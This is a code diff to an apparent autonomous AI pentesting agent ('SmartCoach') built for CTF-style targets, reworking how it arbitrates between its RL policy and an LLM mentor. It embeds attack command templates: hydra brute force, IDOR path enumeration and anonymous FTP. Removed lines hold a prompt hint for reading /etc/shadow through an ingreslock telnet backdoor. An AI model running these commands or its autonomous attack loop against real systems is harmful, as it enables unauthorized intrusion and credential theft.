@@ -534,7 +534,7 @@ class SmartCoach:
         # R60: Increased budget 3→5, cooldown 4→2, lower thresholds.
         # =====================================================================
         self._codex_meta_calls_episode = 0
-        self._codex_meta_max_per_episode = 5
+        self._codex_meta_max_per_episode = 1  # Phase 53: 2→1 — minimal codex
         self._codex_meta_cooldown = 0
         self._codex_meta_phase_steps = 0
         self._codex_meta_last_phase = None
@@ -544,7 +544,7 @@ class SmartCoach:
 
         # ─── R66: Codex Strategic role (episode-level plan repair) ───
         self._codex_strategic_calls_episode = 0
-        self._codex_strategic_max_per_episode = 3  # separate budget
+        self._codex_strategic_max_per_episode = 1  # Phase 53: 3→1 — minimal strategic
         self._codex_strategic_cooldown = 0
         # R66: Coherence + macro_conf injected from orchestrator each step
         self._r66_coherence: float = 0.5
@@ -830,6 +830,33 @@ class SmartCoach:
         self._cred_sprayer: Optional[object] = None
         self._action_grammar: Optional[object] = None
         self._hallucination_guard: Optional[object] = None
+
+        # =====================================================================
+        # STRUCTURAL CONSOLIDATION: Orchestration Harmonization Modules
+        # DecisionCore — single action authority (Phase 1)
+        # MaturityController — single entropy/schedule authority (Phase 2+4)
+        # UnifiedRewardPipeline — single reward computation (Phase 3)
+        # HarmonyMetrics — cross-algorithm observability (Phase 7)
+        # =====================================================================
+        self._decision_core = None
+        self._maturity_controller = None  # Shared — injected by orchestrator
+        self._reward_pipeline = None
+        self._harmony_metrics = None
+        try:
+            from core.decision.decision_core import DecisionCore
+            from core.decision.unified_reward import UnifiedRewardPipeline
+            from core.decision.harmony_metrics import HarmonyMetrics
+            self._decision_core = DecisionCore()
+            self._reward_pipeline = UnifiedRewardPipeline()
+            self._harmony_metrics = HarmonyMetrics()
+            # Register MaturityController as the SOLE entropy writer
+            self._harmony_metrics.register_entropy_writer("maturity_controller")
+            logger.debug(
+                f"[HARMONY] {agent_name}: DecisionCore + RewardPipeline + "
+                f"HarmonyMetrics initialized"
+            )
+        except Exception as e:
+            logger.debug(f"[HARMONY] Init partial for {agent_name}: {e}")
 
         logger.debug(
             f"[P41] {agent_name}: submodule delegation initialized "
@@ -2019,12 +2046,13 @@ class SmartCoach:
         threshold = _CODEX_THRESHOLDS.get(current_phase, 12)
 
         # R60: Multiple trigger conditions (any one sufficient)
+        # Phase 52: Repeat every 6 steps (was 4) — with only 2 budget, be selective
         _stagnation_trigger = (
             self._codex_meta_phase_steps >= threshold
-            and (self._codex_meta_phase_steps - threshold) % 4 == 0
+            and (self._codex_meta_phase_steps - threshold) % 6 == 0
         )
-        _antirepeat_spike = self._codex_meta_antirepeat_hits >= 3
-        _gate_storm = self._codex_meta_gate_overrides >= 3
+        _antirepeat_spike = self._codex_meta_antirepeat_hits >= 4  # Phase 52: 3→4
+        _gate_storm = self._codex_meta_gate_overrides >= 4         # Phase 52: 3→4
         # R67: Reward velocity stall trigger
         _velocity_stall = self._r67_stalling and self._codex_meta_phase_steps >= 3
 
@@ -3165,20 +3193,30 @@ class SmartCoach:
         # Decision priority: Skill Library → Playbook → CODEX STRATEGIC → CODEX TACTICAL → CognitionNode → (Mentor OR PPO) → Registry
         
         # =====================================================================
-        # R66: ENTROPY GATING — Modulate PPO exploration by coherence + macro_conf
-        # Low coherence → higher entropy (need more exploration)
-        # High macro confidence + high coherence → lower entropy (exploit)
+        # R66: ENTROPY GATING — CONSOLIDATED via MaturityController
+        # Previously mutated ppo._entropy_adaptive_multiplier directly.
+        # Now: MaturityController is the SOLE entropy authority.
+        # SmartCoach only signals exploration boost REQUEST (not direct write).
         # =====================================================================
-        if self.ppo_agent is not None:
+        if self.ppo_agent is not None and self._maturity_controller is not None:
             _coh = self._r66_coherence
             _mconf = self._r66_macro_conf
             if _coh < 0.30:
-                # Collapsing coherence → boost exploration
+                self._maturity_controller.request_exploration_boost(
+                    reason=f"low_coherence_{_coh:.2f}",
+                    magnitude=0.4,
+                    duration_episodes=3,
+                )
+            # High coherence needs no action — MaturityController handles natural decay
+        elif self.ppo_agent is not None:
+            # Legacy fallback when MaturityController not wired
+            _coh = self._r66_coherence
+            _mconf = self._r66_macro_conf
+            if _coh < 0.30:
                 self.ppo_agent._entropy_adaptive_multiplier = min(
                     2.0, self.ppo_agent._entropy_adaptive_multiplier * 1.4
                 )
             elif _coh > 0.65 and _mconf > 0.70:
-                # High coherence + confident macro → reduce exploration
                 self.ppo_agent._entropy_adaptive_multiplier = max(
                     0.5, self.ppo_agent._entropy_adaptive_multiplier * 0.85
                 )
@@ -3361,350 +3399,49 @@ class SmartCoach:
                 f"skill={skill_result is not None}"
             )
         
-        if skill_result is not None:
-            result = skill_result
-        elif (web_followup := self._web_path_followup(step_ctx, discovery_board)) is not None:
-            # Web path follow-up takes priority over playbook — once ffuf/gobuster
-            # discovers paths like /data, we MUST explore them immediately (curl + IDOR)
-            # before the playbook chain continues with unrelated steps.
-            result = web_followup
-            logger.debug(
-                f"[WEB_FOLLOWUP][{self.agent_name}] Fired: {web_followup.command[:80]}"
-            )
-        elif playbook_result is not None:
-            result = playbook_result
-        elif micro_chain_result is not None:
-            result = micro_chain_result
-        elif phase_guided_result is not None:
-            result = phase_guided_result
-        elif codex_meta_result is not None:
-            result = codex_meta_result
-            # Store negative PPO trajectory: PPO/DDQN failed to break stagnation
-            if self._ppo_pending is not None:
-                if self.ppo_agent is not None:
-                    try:
-                        self.ppo_agent.store_transition(
-                            state=self._ppo_pending["state"],
-                            action=self._ppo_pending["action"],
-                            log_prob=self._ppo_pending["log_prob"],
-                            reward=-3.0,  # PPO failed to break stagnation
-                            value=self._ppo_pending["value"],
-                            done=False,
-                        )
-                    except Exception:
-                        pass
-                self._ppo_pending = None
-        elif cognition_decision is not None:
-            # PHASE 8: CognitionNode fused a confident action from multi-brain
-            result = cognition_decision
-        elif (hyp_result := self._p14_hypothesis_select(step_ctx, filtered_commands)) is not None:
-            # Phase 14.0: Hypothesis-driven command selection
-            result = hyp_result
-        else:
-            # ─── Phase 15.0: ActionArbitrator gate ───────────────────
-            # If arbitrator is active, collect candidates and select best.
-            # Falls through to legacy cascade on failure or when FF is off.
-            _arb_used = False
-            if self._p15_action_arbitrator is not None:
-                try:
-                    from core.neurorouter.action_arbitrator import ArbitrationCandidate
-                    _arb_candidates: list = []
-                    _arb_aggression = self._p15_aggression_level
+        # =====================================================================
+        # P51: FORCE ALL web probes before DecisionCore arbitration.
+        # Web followup probes (homepage → common_paths → path explore →
+        # IDOR enum → link extract → download+cred extract) are critical
+        # for CTF web apps (e.g., Cap's /data/N IDOR → PCAP → FTP creds).
+        # They lose to PPO in DecisionCore weighted scoring (PPO base=1.0
+        # vs followup base=0.80 + maturity scaling). Force ALL probes —
+        # each fires ONCE per path per engagement, then _web_path_followup
+        # returns None and PPO resumes control.
+        # =====================================================================
+        _web_probe = self._web_path_followup(step_ctx, discovery_board)
+        if _web_probe is not None:
+            self._step_reasoning_log.append({
+                "event": "web_probe_forced",
+                "detail": f"Forcing web probe: {getattr(_web_probe, 'template_name', 'unknown')}",
+            })
+            return _web_probe
 
-                    # Candidate 1: PPO
-                    if self.ppo_agent and self.action_mapper:
-                        _ppo_cand_result = self._ppo_select_command(step_ctx, filtered_commands)
-                        if _ppo_cand_result is not None:
-                            _arb_candidates.append(ArbitrationCandidate(
-                                source="ppo",
-                                command=_ppo_cand_result.command or "",
-                                expected_value=_ppo_cand_result.confidence * 5.0,
-                                confidence=_ppo_cand_result.confidence,
-                                phase_fit=0.7,
-                                reason="ppo_policy",
-                            ))
+        # =====================================================================
+        # P1: Decision Sovereignty — DecisionCore.arbitrate()
+        # All source producers above have run. Collect as Advisory objects
+        # and let DecisionCore pick the single winner via weighted scoring.
+        # Replaces: 12-level cascade, ActionArbitrator, coin flip,
+        #           mentor-first/PPO-first paths, codex stagnation override.
+        # =====================================================================
+        result = self._p1_arbitrate_decision(
+            step_ctx=step_ctx,
+            proposed_action=proposed_action,
+            confidence=confidence,
+            skill_result=skill_result,
+            playbook_result=playbook_result,
+            micro_chain_result=micro_chain_result,
+            phase_guided_result=phase_guided_result,
+            codex_meta_result=codex_meta_result,
+            cognition_decision=cognition_decision,
+            filtered_commands=filtered_commands,
+            discovery_board=discovery_board,
+            gpt_available=gpt_available,
+            should_call_gpt=should_call_gpt,
+            mentor_engagement=mentor_engagement,
+            gpt_reason=gpt_reason,
+        )
 
-                    # Candidate 2: Registry
-                    _reg_result = self._decide_from_registry(step_ctx, proposed_action, confidence)
-                    if _reg_result and _reg_result.command:
-                        _arb_candidates.append(ArbitrationCandidate(
-                            source="registry",
-                            command=_reg_result.command,
-                            expected_value=_reg_result.confidence * 3.0,
-                            confidence=_reg_result.confidence,
-                            phase_fit=0.8,
-                            reason="registry_match",
-                        ))
-
-                    # Candidate 3: Skill library (if available)
-                    if skill_result is not None:
-                        _arb_candidates.append(ArbitrationCandidate(
-                            source="skill",
-                            command=skill_result.command or "",
-                            expected_value=skill_result.confidence * 4.0,
-                            confidence=skill_result.confidence,
-                            phase_fit=0.75,
-                            reason="skill_library",
-                        ))
-
-                    if _arb_candidates:
-                        _arb_log = self._p15_action_arbitrator.arbitrate(
-                            _arb_candidates, aggression=_arb_aggression, step=step_ctx.step,
-                        )
-                        if _arb_log.winner_command:
-                            result = SmartDecisionResult(
-                                command=_arb_log.winner_command,
-                                template_name=_arb_log.winner_source,
-                                source=f"arbitrator_{_arb_log.winner_source}",
-                                confidence=min(1.0, _arb_log.winner_score),
-                                reasoning=f"Arbitrated: {_arb_log.reason_codes}",
-                            )
-                            _arb_used = True
-                            logger.debug(
-                                f"[P15][ARB] {self.agent_name}: winner={_arb_log.winner_source} "
-                                f"score={_arb_log.winner_score:.3f} "
-                                f"n={_arb_log.candidates_count}"
-                            )
-                            self._step_reasoning_log.append({
-                                "event": "arbitrator",
-                                "winner": _arb_log.winner_source,
-                                "score": round(_arb_log.winner_score, 3),
-                                "candidates": _arb_log.candidates_count,
-                            })
-                except Exception as e:
-                    logger.debug(f"[P15] Arbitrator failed, falling through: {e}")
-
-            # ─── Legacy cascade (when arbitrator not active or not used) ─
-            # Phase 15.0: Skip legacy cascade when arbitrator already picked
-            # ─── Legacy cascade (when arbitrator not active or not used) ─
-            # P36: Token budget reallocation — Red +100%, Orion +50%, others -20%
-            # Red/Orion are primary reasoning agents and get higher mentor rates
-            # Scout/Shadow/Blue get reduced rates — they produce less novel value
-            _is_red = self.agent_name == "RedAgent"
-            _is_orion = self.agent_name == "OrionAgent"
-            _is_key_agent = _is_red or _is_orion
-            if _is_red:
-                # P36: Red +100% — highest reasoning budget for exploit decisions
-                # Decay: 0.80 → 0.45 over 175 episodes (very slow)
-                base_mentor_rate = max(0.45, min(0.80, 0.80 - self.current_episode * 0.002))
-            elif _is_orion:
-                # P36: Orion +50% — strategic coordinator needs strong reasoning
-                # Decay: 0.75 → 0.40 over 175 episodes
-                base_mentor_rate = max(0.40, min(0.75, 0.75 - self.current_episode * 0.002))
-            else:
-                # P36: Other agents -20% — Scout/Shadow/Blue use less reasoning
-                # Decay: 0.50 → 0.15 over ~70 episodes
-                base_mentor_rate = max(0.15, min(0.50, 0.50 - self.current_episode * 0.005))
-            
-            # Accelerate decay if PPO is learning well (low entropy = confident)
-            ppo_confidence_boost = 0.0
-            if self.ppo_agent and hasattr(self.ppo_agent, 'training_metrics'):
-                recent_entropy = self.ppo_agent.training_metrics.get('entropy', [])
-                if recent_entropy:
-                    # Lower entropy → more confident → less mentor needed
-                    avg_entropy = sum(recent_entropy[-5:]) / max(len(recent_entropy[-5:]), 1)
-                    max_entropy = self.ppo_agent.config.entropy_coef * 10  # rough max
-                    if max_entropy > 0:
-                        ppo_confidence_boost = max(0, 0.10 * (1.0 - avg_entropy / max_entropy))
-            
-            # P36: Confidence-gated dynamic floor/ceiling
-            # Red gets highest bounds, Orion mid, others low
-            if _is_red:
-                _dynamic_floor = 0.45
-                _dynamic_ceiling = 0.85
-            elif _is_orion:
-                _dynamic_floor = 0.40
-                _dynamic_ceiling = 0.80
-            else:
-                _dynamic_floor = 0.15
-                _dynamic_ceiling = 0.55
-            if ppo_confidence_boost > 0.06:
-                # PPO is confident — reduce mentor floor to save tokens
-                _dynamic_floor *= max(0.6, 1.0 - ppo_confidence_boost * 3)
-                _dynamic_ceiling *= max(0.7, 1.0 - ppo_confidence_boost * 2)
-                logger.debug(
-                    f"[{self.agent_name}] PPO confident (boost={ppo_confidence_boost:.3f}) → "
-                    f"mentor bounds [{_dynamic_floor:.2f}, {_dynamic_ceiling:.2f}]"
-                )
-            elif ppo_confidence_boost < 0.02:
-                # PPO is unsure — raise floor +260% for maximum mentor→apprentice guidance
-                _dynamic_floor *= 3.60  # Phase 12.0: +50% (was 2.73)
-                _dynamic_ceiling = min(1.0, _dynamic_ceiling * 1.32)  # Phase 12.0: +50% (was 1.21)
-                logger.debug(
-                    f"[{self.agent_name}] PPO unsure → "
-                    f"mentor bounds [{_dynamic_floor:.2f}, {_dynamic_ceiling:.2f}]"
-                )
-            
-            effective_mentor_rate = max(_dynamic_floor, min(_dynamic_ceiling, base_mentor_rate - ppo_confidence_boost))
-            
-            # ─── Phase 14.0: AutonomyScheduler gating ───────────────
-            # If autonomy scheduler is active, it can suppress mentor
-            # calls when the agent scores above the episode threshold.
-            if self._p14_autonomy_scheduler is not None:
-                _auto_call, _auto_reason = self._p14_autonomy_scheduler.should_call_mentor(
-                    self.agent_name, self.current_episode
-                )
-                if not _auto_call:
-                    # Agent is autonomous — suppress mentor
-                    effective_mentor_rate = 0.0
-                    logger.debug(
-                        f"[P14] {self.agent_name} autonomous: {_auto_reason}"
-                    )
-
-            # Roll dice: mentor leads vs PPO leads
-            import random as _rand
-            mentor_leads = (_rand.random() < effective_mentor_rate)
-            
-            # Phase 15.0: Preserve arbitrator result if set
-            if not _arb_used:
-                result = None  # Will be set by whichever path succeeds
-            
-            if _arb_used and result is not None:
-                # Phase 15.0: Arbitrator already decided — skip legacy mentor/PPO
-                pass
-            elif mentor_leads and gpt_available:
-                # MENTOR-FIRST: Let mentor pick the command, store as demo for PPO
-                logger.debug(
-                    f"[{self.agent_name}] Mentor-first (rate={effective_mentor_rate:.2f}, "
-                    f"ep={self.current_episode})"
-                )
-                # Determine model from engagement tier
-                if mentor_engagement is not None and mentor_engagement.engage:
-                    orig_model = self.model
-                    self.model = mentor_engagement.model
-                    _exfil_hint = (
-                        "Focus on data exfiltration via ingreslock backdoor. Try: "
-                        "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet target 1524, "
-                        "{ echo 'base64 /etc/passwd'; sleep 2; } | timeout 10 telnet target 1524."
-                    ) if getattr(mentor_engagement, 'exfil_guidance', False) else None
-                    result = self._decide_with_mentor(
-                        step_ctx, proposed_action, confidence, filtered_commands,
-                        exfil_prompt=_exfil_hint,
-                    )
-                    self.model = orig_model
-                else:
-                    result = self._decide_with_mentor(
-                        step_ctx, proposed_action, confidence, filtered_commands
-                    )
-                
-                if result.mentor_call:
-                    # Phase 6.4: ALSO run PPO to build trajectory, but DON'T use its decision.
-                    # Store mentor's template as _mentor_suggestion so PPO gets
-                    # imitation bonus when it agrees with the mentor.
-                    result._mentor_suggestion = result.template_name
-                    
-                    # Run PPO shadow selection (for learning, not for execution)
-                    _student_action_idx = None
-                    _student_command = None
-                    _student_template = None
-                    _student_log_prob = None
-                    _student_confidence = None
-                    if self.ppo_agent and self.action_mapper:
-                        ppo_shadow = self._ppo_select_command(step_ctx, filtered_commands)
-                        if ppo_shadow is not None:
-                            # PPO made a choice — store its trajectory.
-                            # The reward it gets will include mentor conformity bonus
-                            # if PPO independently chose the same template.
-                            result._mentor_suggestion = result.template_name
-                            # _ppo_pending is already set by _ppo_select_command
-                            _student_command = getattr(ppo_shadow, 'command', None)
-                            _student_template = getattr(ppo_shadow, 'template_name', None)
-                            if self._ppo_pending:
-                                _student_action_idx = self._ppo_pending.get('action')
-                                _student_log_prob = self._ppo_pending.get('log_prob')
-                                _student_confidence = getattr(ppo_shadow, 'confidence', None)
-
-                    # ─── Phase 14.0: Create TeacherTrace ──────────────
-                    if self._p14_bc_buffer is not None:
-                        try:
-                            from core.reasoning.teacher_trace import TeacherTrace
-                            _state_id = f"ep{self.current_episode}_s{step_ctx.step}"
-                            _teacher_action_idx = 0  # default
-                            if self.action_mapper and result.template_name:
-                                try:
-                                    _teacher_action_idx = self.action_mapper.command_to_action(
-                                        result.template_name
-                                    )
-                                    if _teacher_action_idx < 0:
-                                        _teacher_action_idx = 0
-                                except Exception:
-                                    _teacher_action_idx = 0
-                            trace = TeacherTrace(
-                                state_id=_state_id,
-                                state_vector=self._ppo_pending.get('state', []) if self._ppo_pending else [],
-                                teacher_action_idx=_teacher_action_idx,
-                                teacher_command=result.command or "",
-                                teacher_template=result.template_name or "",
-                                rationale=result.mentor_reasoning or "",
-                                confidence=result.confidence,
-                                student_action_idx=_student_action_idx if _student_action_idx is not None else 0,
-                                student_command=_student_command or "",
-                                student_template=_student_template or "",
-                                student_log_prob=_student_log_prob if _student_log_prob is not None else 0.0,
-                                student_confidence=_student_confidence if _student_confidence is not None else 0.0,
-                                episode=self.current_episode,
-                                step=step_ctx.step,
-                                agent_id=self.agent_name,
-                                phase=str(getattr(step_ctx, 'phase', 'RECON')),
-                            )
-                            self._p14_bc_buffer.store(trace)
-                            self._p14_traces_this_episode.append(trace)
-                            logger.debug(
-                                f"[P14] TeacherTrace: div={trace.compute_divergence():.1f} "
-                                f"teacher={result.template_name} student={_student_template}"
-                            )
-                        except Exception as e:
-                            logger.debug(f"[P14] TeacherTrace creation failed: {e}")
-                else:
-                    # Mentor call failed — fall through to PPO
-                    mentor_leads = False
-            
-            # If mentor didn't lead or mentor call failed, PPO takes over
-            # Phase 15.0: Skip when arbitrator already decided
-            if not _arb_used and (result is None or not getattr(result, 'mentor_call', False)):
-                # PPO-FIRST (or mentor failed): PPO drives, mentor advises
-                ppo_result = None
-                if self.ppo_agent and self.action_mapper:
-                    ppo_result = self._ppo_select_command(step_ctx, filtered_commands)
-                
-                if ppo_result is not None:
-                    result = ppo_result
-                    # If mentor should have been called (per controller), attach as advisory
-                    if (should_call_gpt and gpt_available and mentor_engagement is not None):
-                        logger.debug(
-                            f"[{self.agent_name}] Mentor advisory: {gpt_reason} "
-                            f"(tier={mentor_engagement.tier.value})"
-                        )
-                        orig_model = self.model
-                        self.model = mentor_engagement.model
-                        _exfil_hint2 = (
-                            "Focus on data exfiltration via ingreslock backdoor. Try: "
-                            "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet target 1524, "
-                            "{ echo 'base64 /etc/passwd'; sleep 2; } | timeout 10 telnet target 1524."
-                        ) if getattr(mentor_engagement, 'exfil_guidance', False) else None
-                        mentor_result = self._decide_with_mentor(
-                            step_ctx, proposed_action, confidence, filtered_commands,
-                            exfil_prompt=_exfil_hint2,
-                        )
-                        self.model = orig_model
-                        if mentor_result.mentor_call:
-                            mentor_result.mentor_reasoning = f"[{gpt_reason}] {mentor_result.mentor_reasoning or ''}"
-                            mentor_result._mentor_suggestion = mentor_result.template_name
-                            result._mentor_suggestion = mentor_result.template_name
-                            # For DELIBERATIVE tier: override PPO with mentor
-                            if mentor_engagement.tier == MentorTier.DELIBERATIVE:
-                                result = mentor_result
-                elif should_call_gpt and gpt_available:
-                    # PPO unavailable, use mentor directly
-                    logger.debug(f"[{self.agent_name}] GPT call triggered: {gpt_reason}")
-                    result = self._decide_with_mentor(step_ctx, proposed_action, confidence, filtered_commands)
-                    result.mentor_reasoning = f"[{gpt_reason}] {result.mentor_reasoning or ''}"
-                else:
-                    # Registry-first: efficient, no token usage
-                    result = self._decide_from_registry(step_ctx, proposed_action, confidence)
-                    if should_call_gpt and not gpt_available:
-                        logger.debug(f"[{self.agent_name}] GPT needed but unavailable, using registry")
-        
         # =========================================================================
         # PHASE 17: NULL SAFETY — guarantee `result` is never None past this point.
         # If the entire decision cascade failed to produce a result, fall back to
@@ -4029,6 +3766,11 @@ class SmartCoach:
         # 4. Role violations still get hard-replaced
         #
         # PPO decisions are still exempt (they have pre-selection masking).
+        #
+        # P50 FIX: Stagnation-aware thresholds + flag capture whitelist.
+        # When stagnation > 15, thresholds are raised to give the system more
+        # chances to retry productive commands instead of cycling through
+        # random alternatives that waste budget.
         # =========================================================================
         all_cmds = ctx.command_history if ctx.command_history else []
         result_prefix = self._extract_tool_prefix(result.command) if result.command else ""
@@ -4038,6 +3780,48 @@ class SmartCoach:
         exact_repeat_count = sum(1 for c in all_cmds if c.strip() == result_cmd_norm)
         prefix_repeat_count = sum(1 for c in all_cmds 
                                    if self._extract_tool_prefix(c) == result_prefix)
+        
+        # ── P50: Stagnation-aware threshold scaling ──────────────────
+        # When the system is stuck for 15+ steps without discoveries, raise
+        # repeat thresholds. This prevents the anti-repeat from blocking
+        # potentially productive commands while the system is struggling.
+        _stag = getattr(self, '_stagnation_steps', 0)
+        _exact_threshold = 3    # Default: hard replace on 3rd exact repeat
+        _prefix_threshold = 5   # Default: hard replace on 5th prefix repeat
+        _family_threshold = 8   # Default: hard replace on 8th family repeat
+        if _stag >= 25:
+            _exact_threshold = 8
+            _prefix_threshold = 12
+            _family_threshold = 16
+        elif _stag >= 15:
+            _exact_threshold = 6
+            _prefix_threshold = 8
+            _family_threshold = 12
+        
+        # ── P50: Flag capture whitelist ──────────────────────────────
+        # In late phases (POST_EXPLOITATION+), flag-reading commands MUST
+        # not be blocked by anti-repeat. These are the GOAL commands.
+        _flag_capture_bypass = False
+        if result_cmd_norm:
+            _late_phases = {
+                AttackPhase.POST_EXPLOITATION, AttackPhase.EXFILTRATION,
+                AttackPhase.CLOSEOUT, AttackPhase.PRIVILEGE_ESCALATION,
+                AttackPhase.LATERAL_MOVEMENT,
+            }
+            _is_late_phase = current_phase in _late_phases
+            _FLAG_PATTERNS = (
+                "cat /root/root.txt", "cat /root/flag", "cat /home/",
+                "user.txt", "root.txt", "proof.txt", "flag.txt",
+                "type C:\\Users\\", "type C:\\flag",
+            )
+            _is_flag_cmd = any(p in result_cmd_norm for p in _FLAG_PATTERNS)
+            if _is_flag_cmd and _is_late_phase:
+                _flag_capture_bypass = True
+                logger.info(
+                    f"[{self.agent_name}] FLAG-CAPTURE-BYPASS: Allowing "
+                    f"'{result_cmd_norm[:60]}' despite repeat count "
+                    f"{exact_repeat_count} (phase={current_phase.name})"
+                )
         
         # R42: PPO bypass should NOT apply to heavy prefix repeats.
         # In R41, Orion PPO looped ldapsearch 4+ times because PPO was fully exempt.
@@ -4067,12 +3851,12 @@ class SmartCoach:
         # Graded penalty tracking (stored on result for reward calculator)
         repeat_penalty = 0.0
         
-        if not ppo_bypass:
+        if not ppo_bypass and not _flag_capture_bypass:
             # Role violation → hard replace (always)
             if not is_valid_role:
                 result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds, "role_violation")
-            # Exact repeat → hard replace (3rd+ time) or penalty (1st-2nd)
-            elif exact_repeat_count >= 3:
+            # Exact repeat → hard replace (threshold+ time) or penalty (1st-2nd)
+            elif exact_repeat_count >= _exact_threshold:
                 result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds, 
                     f"exact_repeat_x{exact_repeat_count}")
             elif exact_repeat_count >= 1:
@@ -4082,12 +3866,12 @@ class SmartCoach:
                     f"[REPEAT-PENALTY:{repeat_penalty:.1f}] "
                     f"{result.mentor_reasoning or ''}"
                 )
-            # Family cooldown: if same family used >8 times, replace
-            elif family_count >= 8:
+            # Family cooldown: if same family used >threshold times, replace
+            elif family_count >= _family_threshold:
                 result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds,
                     f"family_cooldown({family}={family_count})")
-            # Prefix repeat → penalize but allow up to 5, then replace
-            elif prefix_repeat_count >= 5:
+            # Prefix repeat → penalize but allow up to threshold, then replace
+            elif prefix_repeat_count >= _prefix_threshold:
                 result = self._replace_with_alternative(result, step_ctx, ctx, all_cmds,
                     f"prefix_repeat_x{prefix_repeat_count}")
             elif prefix_repeat_count >= 2:
@@ -4382,6 +4166,44 @@ class SmartCoach:
         # Record decision
         self.decisions.append(result)
         
+        # =====================================================================
+        # P1: DecisionCore tracking now happens inside _p1_arbitrate_decision
+        # via DecisionCore.arbitrate() → _record_hit(). No passive tracking
+        # needed here. HarmonyMetrics records final attribution below.
+        # =====================================================================
+
+        # Get arbitration scores from DecisionCore's last result
+        _arb_weights: Optional[Dict[str, float]] = None
+        if self._decision_core is not None:
+            try:
+                _last_arb = getattr(self._decision_core, "last_result", None)
+                if _last_arb is not None:
+                    _arb_weights = {
+                        k: round(v, 4)
+                        for k, v in getattr(
+                            _last_arb, "all_scores", {}
+                        ).items()
+                    }
+            except Exception:
+                pass
+
+        if self._harmony_metrics is not None:
+            try:
+                self._harmony_metrics.record_decision(
+                    source=result.source or "unknown",
+                    arbitration_weights=_arb_weights,
+                )
+                # Track DDQN macro switches
+                if self._active_macro is not None:
+                    _macro_name = (
+                        self._active_macro.name
+                        if hasattr(self._active_macro, 'name')
+                        else str(self._active_macro)
+                    )
+                    self._harmony_metrics.record_macro_step(_macro_name)
+            except Exception as e:
+                logger.debug(f"[HARMONY] Metrics recording failed: {e}")
+
         # Phase 9: Record reasoning trace to CognitiveBus
         try:
             bus = self._get_cognitive_bus()
@@ -4651,6 +4473,10 @@ class SmartCoach:
         Returns a rendered command string, or None if no suitable command found.
         Uses the same filtering pipeline as _decide_registry / _force_novel_command
         but in a lightweight path suitable for anti-repeat fallback.
+
+        P50: Gap-aware scoring — prioritizes commands that address known gaps
+        in the discovery board (e.g., no creds → cred discovery, no shell → 
+        access commands) instead of random top-5 selection.
         """
         import random
         try:
@@ -4703,16 +4529,68 @@ class SmartCoach:
                 prefix_uses = sum(1 for p in used_prefixes if p == prefix)
                 if prefix_uses >= 3:
                     continue
-                candidates.append((rendered, template.typical_reward))
+                candidates.append((rendered, template.typical_reward, template.tags))
             
             if not candidates:
                 return None
             
-            # 6. Sort by typical_reward descending and pick from top tier
-            candidates.sort(key=lambda x: x[1], reverse=True)
-            # Pick randomly from top 5 to maintain exploration
-            top_n = min(5, len(candidates))
-            chosen = random.choice(candidates[:top_n])
+            # ── P50: Gap-aware scoring ──────────────────────────────
+            # Instead of random top-5, score candidates by how well they
+            # address the current gap in discoveries.
+            _has_creds = state_flags.get("credentials_known", False)
+            _has_shell = state_flags.get("shell_obtained", False)
+            _has_root = state_flags.get("root_shell_obtained", False)
+            _has_vuln = state_flags.get("vuln_discovered", False)
+            _has_services = state_flags.get("services_discovered", False)
+
+            def _gap_score(cmd_str: str, reward: float, tags: set) -> float:
+                """Score a candidate by how well it addresses discovery gaps."""
+                score = reward  # Base: typical_reward
+                cmd_lower = cmd_str.lower()
+
+                # Boost web discovery if no creds/shell (common CTF path)
+                if not _has_creds and not _has_shell:
+                    if any(k in cmd_lower for k in ("curl", "wget", "gobuster", "ffuf",
+                                                      "nikto", "dirb", "feroxbuster")):
+                        score += 5.0
+                    if any(k in cmd_lower for k in ("/data", "/download", "/api",
+                                                      "/admin", "/backup", "/files")):
+                        score += 8.0
+
+                # Boost credential discovery if no creds
+                if not _has_creds:
+                    if "cred" in str(tags) or "brute" in str(tags):
+                        score += 6.0
+                    if any(k in cmd_lower for k in ("hydra", "medusa", "crackmapexec",
+                                                      "enum4linux", "smbclient")):
+                        score += 4.0
+
+                # Boost access commands if creds but no shell
+                if _has_creds and not _has_shell:
+                    if any(k in cmd_lower for k in ("sshpass", "ssh ", "ftp ",
+                                                      "winrm", "psexec", "evil-winrm")):
+                        score += 10.0
+
+                # Boost privesc if shell but no root
+                if _has_shell and not _has_root:
+                    if any(k in cmd_lower for k in ("sudo", "linpeas", "linenum",
+                                                      "getcap", "suid", "privesc")):
+                        score += 8.0
+
+                # Boost PCAP/traffic analysis for web-focused CTFs
+                if not _has_creds and _has_services:
+                    if any(k in cmd_lower for k in ("tshark", "tcpdump", "strings",
+                                                      "pcap", ".cap")):
+                        score += 6.0
+
+                return score
+
+            scored = [(cmd, _gap_score(cmd, rwd, tags)) for cmd, rwd, tags in candidates]
+            scored.sort(key=lambda x: x[1], reverse=True)
+
+            # Pick from top 3 (tighter than old top-5 → more strategic)
+            top_n = min(3, len(scored))
+            chosen = random.choice(scored[:top_n])
             return chosen[0]
             
         except Exception as e:
@@ -4832,6 +4710,23 @@ class SmartCoach:
                 f"searchsploit openssh 8.2",
                 f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst ssh://{target} -t 4",
                 f"hydra -l root -P /usr/share/nmap/nselib/data/passwords.lst ftp://{target} -t 4",
+                # P50: Web app path enumeration (Cap-style CTFs with /data/N endpoints)
+                f"curl -sI http://{target}/",
+                f"curl -s http://{target}/ | head -100",
+                f"curl -s http://{target}/data/0",
+                f"curl -s http://{target}/data/1",
+                f"curl -s http://{target}/data/2",
+                f"curl -s http://{target}/api/ 2>/dev/null || curl -s http://{target}/admin/ 2>/dev/null",
+                f"curl -s http://{target}/ | grep -oP 'href=\"[^\"]+\"' | head -20",
+                f"curl -s http://{target}/ | grep -oP 'src=\"[^\"]+\"' | head -20",
+                f"curl -s http://{target}/data/ 2>/dev/null",
+                f"curl -s http://{target}/download/ 2>/dev/null || curl -s http://{target}/capture/ 2>/dev/null",
+                # P50: PCAP/traffic analysis (critical for Cap)
+                f"find /tmp -name '*.pcap' -o -name '*.cap' 2>/dev/null | head -5",
+                f"ls -la /tmp/*.pcap /tmp/*.cap 2>/dev/null",
+                # P50: FTP anonymous access check (sh-compatible, no bash <<<)
+                f"echo -e 'user anonymous\\npass anonymous@\\nls -la\\nbye' | ftp -n {target} 2>/dev/null",
+                f"nmap -sV -p21 --script ftp-anon,ftp-syst {target}",
             ] + ([
                 # If discovered creds — SSH into target
